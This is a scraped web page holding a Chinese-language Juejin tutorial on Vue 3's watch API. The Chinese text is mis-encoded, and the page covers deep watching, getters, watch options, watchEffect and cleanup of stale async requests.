itemprop="name" content="é†’äº†æ¥ç€ç¡"/> <meta itemprop="url" content="https://juejin.cn/user/2113684267875592"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vueä¸­çš„watch
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2113684267875592/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é†’äº†æ¥ç€ç¡
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T05:43:42.000Z" title="Mon Dec 08 2025 05:43:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">æ·±å…¥ç†è§£ <code>watch</code></h2>
<p><code>watch</code> æ˜¯ <code>Vue</code> ç»„åˆå¼ <code>API (Composition API)</code> ä¸­çš„ä¸€ä¸ªæ ¸å¿ƒåŠŸèƒ½ï¼Œå®ƒå…è®¸æˆ‘ä»¬<strong>ä¾¦å¬</strong>ä¸€ä¸ªæˆ–å¤šä¸ªå“åº”å¼æ•°æ®æºï¼Œå¹¶åœ¨æ•°æ®æºå˜åŒ–æ—¶æ‰§è¡Œä¸€ä¸ª<strong>å›è°ƒå‡½æ•°</strong>ã€‚è¿™å¯¹äºæ‰§è¡Œå¼‚æ­¥æ“ä½œæˆ–åŸºäºæ•°æ®å˜åŒ–æ‰§è¡Œå¤æ‚é€»è¾‘éå¸¸æœ‰ç”¨ã€‚</p>
<h4 data-id="heading-1">1. åŸºæœ¬ç”¨æ³•</h4>
<p>æœ€ç®€å•çš„ç”¨æ³•æ˜¯ä¾¦å¬ä¸€ä¸ª <code>ref</code>ã€‚</p>
<ul>
<li>å‚æ•° ï¼š
<ol>
<li><code>watch</code> çš„ç¬¬ä¸€ä¸ªå‚æ•°å¯ä»¥æ˜¯ä¸åŒå½¢å¼çš„â€œæ•°æ®æºâ€ï¼šå®ƒå¯ä»¥æ˜¯ä¸€ä¸ª <code>ref </code>(åŒ…æ‹¬è®¡ç®—å±æ€§)ã€ä¸€ä¸ªå“åº”å¼å¯¹è±¡ã€ä¸€ä¸ª <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FJavaScript%2FReference%2FFunctions%2Fget%23description" target="_blank" title="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/get#description" ref="nofollow noopener noreferrer">getter å‡½æ•°</a>ã€æˆ–å¤šä¸ªæ•°æ®æºç»„æˆçš„æ•°ç»„ï¼š</li>
<li>æ•°æ®å˜åŒ–æ—¶æ‰§è¡Œçš„å›è°ƒå‡½æ•°ï¼Œè¯¥å‡½æ•°æ¥æ”¶æ–°å€¼ (<code>newValue</code>) å’Œæ—§å€¼ (<code>oldValue</code>)ã€‚</li>
</ol>
</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { ref, watch } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-comment">// 1. å®šä¹‰ä¸€ä¸ªå“åº”å¼æ•°æ®</span>
<span class="hljs-keyword">const</span> count = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>)
<span class="hljs-comment">// 2. ä¾¦å¬ count çš„å˜åŒ–</span>
<span class="hljs-title function_">watch</span>(count, <span class="hljs-function">(<span class="hljs-params">newValue, oldValue</span>) =&gt;</span> {
 <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`count ä» <span class="hljs-subst">${oldValue}</span> å˜æˆäº† <span class="hljs-subst">${newValue}</span>`</span>)
})
<span class="hljs-comment">// 3. ä¿®æ”¹æ•°æ®ä»¥è§¦å‘ watch</span>
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
 count.<span class="hljs-property">value</span>++ <span class="hljs-comment">// æ§åˆ¶å°å°†è¾“å‡º: "count ä» 0 å˜æˆäº† 1"</span>
}, <span class="hljs-number">1000</span>)
</code></pre>
<h4 data-id="heading-2">2. ä¾¦å¬å“åº”å¼å¯¹è±¡</h4>
<p>å½“ä¾¦å¬ä¸€ä¸ª <code>reactive</code> å¯¹è±¡æ—¶ï¼Œ<code>watch</code> ä¼šéšå¼åœ°åˆ›å»ºä¸€ä¸ª<strong>æ·±å±‚ä¾¦å¬å™¨</strong>ã€‚è¿™æ„å‘³ç€å¯¹è±¡å†…éƒ¨ä»»ä½•åµŒå¥—å±æ€§çš„å˜åŒ–éƒ½ä¼šè§¦å‘å›è°ƒã€‚</p>
<p><strong>æ³¨æ„</strong>ï¼šæ­¤æ—¶ <code>newValue</code> å’Œ <code>oldValue</code> å°†æ˜¯åŒä¸€ä¸ªå¯¹è±¡å¼•ç”¨ï¼Œå› ä¸ºå®ƒä»¬éƒ½æŒ‡å‘åŒä¸€ä¸ª <code>reactive</code> å¯¹è±¡ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { reactive, watch } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span> state = <span class="hljs-title function_">reactive</span>({
 <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>,
 <span class="hljs-attr">user</span>: {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Alice'</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">20</span>
 }
})

<span class="hljs-title function_">watch</span>(state, <span class="hljs-function">(<span class="hljs-params">newState, oldState</span>) =&gt;</span> {
 <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'state å¯¹è±¡å‘ç”Ÿäº†å˜åŒ–'</span>)
 <span class="hljs-comment">// æ³¨æ„ï¼šnewState === oldState</span>
})
<span class="hljs-comment">// ä¿®æ”¹åµŒå¥—å±æ€§ä¼šè§¦å‘ watch</span>
state.<span class="hljs-property">user</span>.<span class="hljs-property">age</span>++ <span class="hljs-comment">// æ§åˆ¶å°å°†è¾“å‡º: "state å¯¹è±¡å‘ç”Ÿäº†å˜åŒ–"</span>
</code></pre>
<h4 data-id="heading-3">3. ä¾¦å¬ Getter å‡½æ•°</h4>
<p>ä¸ºäº†æ›´ç²¾ç¡®åœ°æ§åˆ¶ä¾¦å¬çš„ç›®æ ‡ï¼Œæˆ–è€…åªä¾¦å¬<strong>å“åº”å¼å¯¹è±¡ä¸­çš„æŸä¸ªå±æ€§</strong>ï¼Œæˆ‘ä»¬å¯ä»¥å‘ <code>watch</code> ä¼ é€’ä¸€ä¸ª <strong>getter å‡½æ•°</strong> <code>() =&gt; ...</code>ã€‚</p>
<p>è¿™æ˜¯æœ€å¸¸ç”¨å’Œæ¨èçš„æ–¹å¼ä¹‹ä¸€ï¼Œå› ä¸ºå®ƒå…·æœ‰æ›´å¥½çš„æ€§èƒ½å’Œæ›´æ˜ç¡®çš„æ„å›¾ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ...æ¥ä¸Šä¸€ä¸ªä¾‹å­</span>
<span class="hljs-comment">// åªä¾¦å¬ state.user.age çš„å˜åŒ–</span>
<span class="hljs-title function_">watch</span>(
 <span class="hljs-function">() =&gt;</span> state.<span class="hljs-property">user</span>.<span class="hljs-property">age</span>,
 <span class="hljs-function">(<span class="hljs-params">newAge, oldAge</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`å¹´é¾„ä» <span class="hljs-subst">${oldAge}</span> å˜æˆäº† <span class="hljs-subst">${newAge}</span>`</span>)
 }
)
state.<span class="hljs-property">user</span>.<span class="hljs-property">age</span>++ <span class="hljs-comment">// æ§åˆ¶å°å°†è¾“å‡º: "å¹´é¾„ä» 20 å˜æˆäº† 21"</span>
state.<span class="hljs-property">id</span>++    <span class="hljs-comment">// ä¸ä¼šè§¦å‘è¿™ä¸ª watch</span>
</code></pre>
<p>ç›¸æ¯”<strong>ä¾¦å¬å“åº”å¼å¯¹è±¡</strong>ï¼Œä¸€ä¸ªè¿”å›å“åº”å¼å¯¹è±¡çš„ <code>getter</code> å‡½æ•°ï¼Œåªæœ‰åœ¨è¿”å›ä¸åŒçš„å¯¹è±¡æ—¶ï¼Œæ‰ä¼šè§¦å‘å›è°ƒï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">watch</span>(
  <span class="hljs-function">() =&gt;</span> state.<span class="hljs-property">someObject</span>,
  <span class="hljs-function">(<span class="hljs-params">newValue, oldValue</span>) =&gt;</span> {
    <span class="hljs-comment">// æ³¨æ„ï¼š`newValue` æ­¤å¤„å’Œ `oldValue` æ˜¯ç›¸ç­‰çš„</span>
    <span class="hljs-comment">// *é™¤é* state.someObject è¢«æ•´ä¸ªæ›¿æ¢äº†</span>
  },
  { <span class="hljs-attr">deep</span>: <span class="hljs-literal">true</span> }	<span class="hljs-comment">// å¯ä»¥ç»™ä¸Šé¢è¿™ä¸ªä¾‹å­æ˜¾å¼åœ°åŠ ä¸Š deep é€‰é¡¹ï¼Œå¼ºåˆ¶è½¬æˆæ·±å±‚ä¾¦å¬å™¨ï¼š</span>
)
</code></pre>
<h4 data-id="heading-4">4. ä¾¦å¬å¤šä¸ªæ•°æ®æº</h4>
<p><code>watch</code> ä¹Ÿå¯ä»¥åŒæ—¶ä¾¦å¬å¤šä¸ªæ•°æ®æºï¼Œåªéœ€å°†å®ƒä»¬æ”¾åœ¨ä¸€ä¸ªæ•°ç»„ä¸­å³å¯ã€‚å›è°ƒå‡½æ•°æ¥æ”¶çš„æ–°æ—§å€¼ä¹Ÿå°†æ˜¯æ•°ç»„ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> firstName = <span class="hljs-title function_">ref</span>(<span class="hljs-string">'John'</span>)
<span class="hljs-keyword">const</span> lastName = <span class="hljs-title function_">ref</span>(<span class="hljs-string">'Doe'</span>)

<span class="hljs-title function_">watch</span>([firstName, lastName], <span class="hljs-function">(<span class="hljs-params">[newFirst, newLast], [oldFirst, oldLast]</span>) =&gt;</span> {
 <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`å§“åä» <span class="hljs-subst">${oldFirst}</span> <span class="hljs-subst">${oldLast}</span> å˜æˆäº† <span class="hljs-subst">${newFirst}</span> <span class="hljs-subst">${newLast}</span>`</span>)
})
firstName.<span class="hljs-property">value</span> = <span class="hljs-string">'Jane'</span> <span class="hljs-comment">// æ§åˆ¶å°å°†è¾“å‡º: "å§“åä» John Doe å˜æˆäº† Jane Doe"</span>
</code></pre>
<h4 data-id="heading-5">5. é…ç½®é€‰é¡¹</h4>
<p><code>watch</code> æ¥å—ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œä¸€ä¸ªé…ç½®å¯¹è±¡ï¼Œç”¨äºè‡ªå®šä¹‰å…¶è¡Œä¸ºã€‚</p>
<ul>
<li>
<p><strong><code>immediate: true</code></strong>: ä½¿ä¾¦å¬å™¨åœ¨åˆ›å»ºæ—¶ç«‹å³æ‰§è¡Œä¸€æ¬¡å›è°ƒã€‚æ­¤æ—¶ <code>oldValue</code> æ˜¯ <code>undefined</code>ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">watch</span>(count, <span class="hljs-function">(<span class="hljs-params">newValue</span>) =&gt;</span> {
 <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`å½“å‰ count æ˜¯: <span class="hljs-subst">${newValue}</span>`</span>)
}, { <span class="hljs-attr">immediate</span>: <span class="hljs-literal">true</span> }) <span class="hljs-comment">// æ§åˆ¶å°ä¼šç«‹å³è¾“å‡º: "å½“å‰ count æ˜¯: 0"</span>
</code></pre>
</li>
<li>
<p><strong><code>deep: true</code></strong>: å¼ºåˆ¶å¼€å¯æ·±å±‚ä¾¦å¬ã€‚å½“ä¾¦å¬ä¸€ä¸ª <code>ref</code> åŒ…è£¹çš„å¯¹è±¡æ—¶ï¼Œå¿…é¡»ä½¿ç”¨æ­¤é€‰é¡¹æ‰èƒ½ä¾¦å¬åˆ°å¯¹è±¡å†…éƒ¨å±æ€§çš„å˜åŒ–ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> state = <span class="hljs-title function_">ref</span>({ <span class="hljs-attr">nested</span>: { <span class="hljs-attr">count</span>: <span class="hljs-number">0</span> } })

<span class="hljs-comment">// å¿…é¡»åŠ  deep: true æ‰èƒ½ä¾¦å¬åˆ° state.value.nested.count çš„å˜åŒ–</span>
<span class="hljs-title function_">watch</span>(state, <span class="hljs-function">(<span class="hljs-params">newState</span>) =&gt;</span> {
 <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'state å†…éƒ¨å‘ç”Ÿäº†å˜åŒ–'</span>)
}, { <span class="hljs-attr">deep</span>: <span class="hljs-literal">true</span> })
state.<span class="hljs-property">value</span>.<span class="hljs-property">nested</span>.<span class="hljs-property">count</span>++ <span class="hljs-comment">// æ§åˆ¶å°å°†è¾“å‡º: "state å†…éƒ¨å‘ç”Ÿäº†å˜åŒ–"</span>
</code></pre>
<p>åœ¨ Vue 3.5+ ä¸­ï¼Œ<code>deep</code> é€‰é¡¹è¿˜å¯ä»¥æ˜¯ä¸€ä¸ªæ•°å­—ï¼Œè¡¨ç¤ºæœ€å¤§éå†æ·±åº¦â€”â€”å³ Vue åº”è¯¥éå†å¯¹è±¡åµŒå¥—å±æ€§çš„çº§æ•°ã€‚</p>
<blockquote>
<p>âœ¨<strong>è°¨æ…ä½¿ç”¨</strong></p>
<p>æ·±åº¦ä¾¦å¬éœ€è¦éå†è¢«ä¾¦å¬å¯¹è±¡ä¸­çš„æ‰€æœ‰åµŒå¥—çš„å±æ€§ï¼Œå½“ç”¨äºå¤§å‹æ•°æ®ç»“æ„æ—¶ï¼Œå¼€é”€å¾ˆå¤§ã€‚å› æ­¤è¯·åªåœ¨å¿…è¦æ—¶æ‰ä½¿ç”¨å®ƒï¼Œå¹¶ä¸”è¦ç•™æ„æ€§èƒ½ã€‚</p>
</blockquote>
</li>
</ul>
<ul>
<li>
<p><strong><code>once: true</code></strong>:æ¯å½“è¢«ä¾¦å¬æºå‘ç”Ÿå˜åŒ–æ—¶ï¼Œä¾¦å¬å™¨çš„å›è°ƒå°±ä¼šæ‰§è¡Œã€‚å¦‚æœå¸Œæœ›å›è°ƒåªåœ¨æºå˜åŒ–æ—¶è§¦å‘ä¸€æ¬¡</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">watch</span>(
  source,
  <span class="hljs-function">(<span class="hljs-params">newValue, oldValue</span>) =&gt;</span> {
    <span class="hljs-comment">// å½“ `source` å˜åŒ–æ—¶ï¼Œä»…è§¦å‘ä¸€æ¬¡</span>
  },
  { <span class="hljs-attr">once</span>: <span class="hljs-literal">true</span> }
)
</code></pre>
<ul>
<li>ä»…æ”¯æŒ 3.4 åŠä»¥ä¸Šç‰ˆæœ¬</li>
</ul>
</li>
<li>
<p><strong><code>flush</code></strong>:è°ƒæ•´å›è°ƒå‡½æ•°çš„åˆ·æ–°æ—¶æœºã€‚å‚è€ƒ<a href="https://link.juejin.cn?target=https%3A%2F%2Fcn.vuejs.org%2Fguide%2Fessentials%2Fwatchers.html%23callback-flush-timing" target="_blank" title="https://cn.vuejs.org/guide/essentials/watchers.html#callback-flush-timing" ref="nofollow noopener noreferrer">å›è°ƒçš„åˆ·æ–°æ—¶æœº</a>åŠ <a href="https://link.juejin.cn?target=https%3A%2F%2Fcn.vuejs.org%2Fapi%2Freactivity-core.html%23watcheffect" target="_blank" title="https://cn.vuejs.org/api/reactivity-core.html#watcheffect" ref="nofollow noopener noreferrer"><code>watchEffect()</code></a>ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">watch</span>(source, callback, {
  <span class="hljs-attr">flush</span>: <span class="hljs-string">'post'</span>	<span class="hljs-comment">//'pre' | 'post' | 'sync' é»˜è®¤ï¼š'pre'</span>
})
<span class="hljs-comment">// watchEffectçš„ç¬¬äºŒä¸ªå‚æ•°</span>
<span class="hljs-title function_">watchEffect</span>(callback, {
  <span class="hljs-attr">flush</span>: <span class="hljs-string">'post'</span>
})
</code></pre>
</li>
</ul>
<h4 data-id="heading-6">6. <code>watch</code> vs <code>watchEffect</code></h4>






























<table><thead><tr><th>ç‰¹æ€§</th><th><code>watch</code></th><th><code>watchEffect</code></th></tr></thead><tbody><tr><td><strong>ä¾èµ–è¿½è¸ª</strong></td><td>æ‰‹åŠ¨æŒ‡å®šï¼Œæ›´æ˜ç¡®</td><td>è‡ªåŠ¨è¿½è¸ªï¼Œæ›´æ–¹ä¾¿</td></tr><tr><td><strong>æ‰§è¡Œæ—¶æœº</strong></td><td>é»˜è®¤æ‡’æ‰§è¡Œï¼ˆæ•°æ®å˜åŒ–åæ‰æ‰§è¡Œï¼‰</td><td>ç«‹å³æ‰§è¡Œä¸€æ¬¡ï¼Œç„¶åè‡ªåŠ¨è¿½è¸ª</td></tr><tr><td><strong>è®¿é—®æ—§å€¼</strong></td><td>å¯ä»¥</td><td>ä¸å¯ä»¥</td></tr><tr><td><strong>ä½¿ç”¨åœºæ™¯</strong></td><td>éœ€è¦çŸ¥é“æ–°æ—§å€¼ã€éœ€è¦ç²¾ç¡®æ§åˆ¶ä¾èµ–ã€æ‰§è¡Œå¼‚æ­¥æˆ–å¤æ‚é€»è¾‘</td><td>ç®€å•çš„å‰¯ä½œç”¨ï¼Œå¦‚æ ¹æ® A çš„å€¼æ›´æ–° Bï¼Œæˆ–æ‰“å°æ—¥å¿—</td></tr></tbody></table>
<blockquote>
<p>âœ¨TIP</p>
<p><code>watchEffect</code> ä»…ä¼šåœ¨å…¶<strong>åŒæ­¥</strong>æ‰§è¡ŒæœŸé—´ï¼Œæ‰è¿½è¸ªä¾èµ–ã€‚åœ¨ä½¿ç”¨å¼‚æ­¥å›è°ƒæ—¶ï¼Œåªæœ‰åœ¨ç¬¬ä¸€ä¸ª <code>await</code> æ­£å¸¸å·¥ä½œå‰è®¿é—®åˆ°çš„å±æ€§æ‰ä¼šè¢«è¿½è¸ªã€‚</p>
</blockquote>
<h5 data-id="heading-7">æ€»ç»“</h5>
<ul>
<li>å½“ä½ éœ€è¦<strong>ç²¾ç¡®æ§åˆ¶</strong>ä¾¦å¬å“ªä¸ªæ•°æ®æ—¶ï¼Œä½¿ç”¨ <code>watch</code>ã€‚</li>
<li>å½“ä½ éœ€è¦è®¿é—®<strong>å˜åŒ–å‰åçš„å€¼</strong>æ—¶ï¼Œä½¿ç”¨ <code>watch</code>ã€‚</li>
<li>å½“ä½ éœ€è¦åœ¨æ•°æ®å˜åŒ–æ—¶æ‰§è¡Œ<strong>å¼‚æ­¥æ“ä½œ</strong>æˆ–å¼€é”€è¾ƒå¤§çš„æ“ä½œæ—¶ï¼Œ<code>watch</code> æä¾›äº†æ›´æ¸…æ™°çš„æ§åˆ¶ã€‚</li>
<li>å¯¹äºç®€å•çš„ã€éœ€è¦ç«‹å³æ‰§è¡Œä¸”è‡ªåŠ¨è¿½è¸ªä¾èµ–çš„å‰¯ä½œç”¨ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨ <code>watchEffect</code>ã€‚</li>
</ul>
<h4 data-id="heading-8">7. å‰¯ä½œç”¨æ¸…ç†</h4>
<p>åœ¨ä¾¦å¬å™¨ä¸­æ‰§è¡Œä¸€ä¸ªå¼‚æ­¥ä»»åŠ¡ï¼Œä½†æ˜¯åœ¨å¼‚æ­¥ä»»åŠ¡è·å–ç»“æœä¹‹å‰åˆé‡æ–°è§¦å‘äº†ä¾¦å¬å™¨</p>
<p>ä¾‹å¦‚é€šè¿‡ <code>id</code> è¯·æ±‚ä¸€ä¸ªæ•°æ®æ¥å£ï¼Œå†æ•°æ®è¿”å›ä¹‹å‰ <code>id</code> å˜åŒ–äº†ï¼Œåˆé‡æ–°è§¦å‘äº†æ–°çš„è¯·æ±‚ç†æƒ³æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¸Œæœ›èƒ½å¤Ÿåœ¨ <code>id</code> å˜ä¸ºæ–°å€¼æ—¶å–æ¶ˆè¿‡æ—¶çš„è¯·æ±‚ã€‚</p>
<p><code>watch</code> å›è°ƒä¸­å¤„ç†<strong>å¼‚æ­¥æ“ä½œ</strong>æ—¶é‡åˆ°çš„**ç«æ€æ¡ä»¶ï¼ˆRace Conditionï¼‰**é—®é¢˜ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fcn.vuejs.org%2Fapi%2Freactivity-core.html%23onwatchercleanup" target="_blank" title="https://cn.vuejs.org/api/reactivity-core.html#onwatchercleanup" ref="nofollow noopener noreferrer"><code>onWatcherCleanup()</code></a> <code>(3.5+)</code>API æ¥æ³¨å†Œä¸€ä¸ªæ¸…ç†å‡½æ•°ï¼Œ<strong>å½“ä¾¦å¬å™¨å¤±æ•ˆå¹¶å‡†å¤‡é‡æ–°è¿è¡Œæ—¶ä¼šè¢«è°ƒç”¨</strong>ï¼š</p>
<blockquote>
<p>ä¾¦å¬å™¨ä½•æ—¶ç”Ÿæ•ˆï¼Ÿ</p>
<ol>
<li><strong>æºæ•°æ®å†æ¬¡å˜åŒ–</strong>ï¼Œå¯¼è‡´ä¾¦å¬å™¨å‡†å¤‡é‡æ–°è¿è¡Œæ—¶ï¼ˆè¿™æ˜¯ä¸ºäº†å¤„ç†ç«æ€æ¡ä»¶ï¼‰ã€‚</li>
<li><strong>ä¾¦å¬å™¨è¢«æ‰‹åŠ¨åœæ­¢</strong>ï¼ˆè°ƒç”¨ <code>stop()</code>ï¼‰ã€‚</li>
<li><strong>ä¾¦å¬å™¨å› ç»„ä»¶å¸è½½è€Œè¢«è‡ªåŠ¨åœæ­¢</strong>ã€‚</li>
<li><strong>ä¾¦å¬å™¨å›  <code>once: true</code> å®Œæˆå…¶å”¯ä¸€ä¸€æ¬¡ä»»åŠ¡è€Œè¢«è‡ªåŠ¨åœæ­¢</strong>ã€‚</li>
</ol>
</blockquote>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { watch, onWatcherCleanup } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-title function_">watch</span>(id, <span class="hljs-function">(<span class="hljs-params">newId</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> controller = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AbortController</span>()
  <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/api/<span class="hljs-subst">${newId}</span>`</span>, { <span class="hljs-attr">signal</span>: controller.<span class="hljs-property">signal</span> }).<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// å›è°ƒé€»è¾‘</span>
  })
  <span class="hljs-title function_">onWatcherCleanup</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// ç»ˆæ­¢è¿‡æœŸè¯·æ±‚</span>
    controller.<span class="hljs-title function_">abort</span>()
  })
})
</code></pre>
<p>è¯·æ³¨æ„ï¼Œ<code>onWatcherCleanup</code> ä»…åœ¨ Vue 3.5+ ä¸­æ”¯æŒï¼Œå¹¶ä¸”å¿…é¡»åœ¨ <code>watchEffect</code> æ•ˆæœå‡½æ•°æˆ– <code>watch</code> å›è°ƒå‡½æ•°çš„åŒæ­¥æ‰§è¡ŒæœŸé—´è°ƒç”¨ï¼šä½ ä¸èƒ½åœ¨å¼‚æ­¥å‡½æ•°çš„ <code>await</code> è¯­å¥ä¹‹åè°ƒç”¨å®ƒã€‚</p>
<p>ä½œä¸ºæ›¿ä»£ï¼Œ<code>onCleanup</code> å‡½æ•°è¿˜ä½œä¸ºç¬¬ä¸‰ä¸ªå‚æ•°ä¼ é€’ç»™ä¾¦å¬å™¨å›è°ƒï¼Œä»¥åŠ <code>watchEffect</code> ä½œç”¨å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼š</p>
